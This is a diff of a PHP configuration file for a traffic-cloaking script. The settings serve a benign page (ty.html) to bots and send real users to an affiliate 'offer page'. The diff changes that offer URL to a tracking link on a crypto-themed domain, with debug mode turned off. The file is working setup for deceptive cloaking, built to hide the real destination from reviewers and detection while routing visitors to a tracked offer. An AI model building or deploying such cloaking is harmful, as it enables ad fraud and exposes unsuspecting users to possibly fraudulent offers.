@@ -1,7 +1,7 @@
 <?php
 /* Required settings     */
 $CLOAKING['WHITE_PAGE'] = 'ty.html';//PHP/HTML file or URL used for bots
-$CLOAKING['OFFER_PAGE'] = 'https://trafficx.g2afse.com/e9HAX2';//PHP/HTML file or URL offer used for real users
+$CLOAKING['OFFER_PAGE'] = 'https://cointracknow.com/go/615d668eacfca01782?sub1=art3-699';//PHP/HTML file or URL offer used for real users
 $CLOAKING['DEBUG_MODE'] = 'off';// replace "on" with "off" to switch from debug to production mode
 $CLOAKING['STEALTH'] = 'off';// replace "on" with "off" to hide stat page
 /*********************************************/
